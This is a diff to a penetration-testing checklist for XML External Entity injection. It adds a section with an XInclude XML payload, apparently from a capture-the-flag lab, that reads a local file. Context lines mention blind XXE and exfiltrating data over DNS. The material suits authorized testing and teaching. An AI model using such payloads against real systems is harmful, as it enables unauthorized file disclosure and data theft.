@@ -1,4 +1,6 @@
-# XXE (XML External Entity) Injection\n\nUse this checklist when testing for XML External Entity (XXE) injection vulnerabilities during penetration testing.
+# XXE (XML External Entity) Injection
+
+Use this checklist when testing for XML External Entity (XXE) injection vulnerabilities during penetration testing.
 
 ### Initial Reconnaissance
 
@@ -41,6 +43,25 @@ Now use the following:
 - [ ] Check for HTTP requests to your server when external entities are processed
 - [ ] Test parameter entity injection for blind XXE exploitation
 - [ ] Attempt to exfiltrate data via DNS (chunked data in subdomain queries)
+
+### Xinclude
+
+From Tanuki (XInclude) on Bugforge
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<deck xmlns:xi="http://www.w3.org/2001/XInclude">
+<name>Test</name>
+<description><xi:include parse="text" href="file://flag.txt"/></description>
+<category>test</category>
+<cards>
+<card>
+<front>Test front</front>
+<back>Test back</back>
+</card>
+</cards>
+</deck>
+```
 
 ### File Retrieval Attacks
 
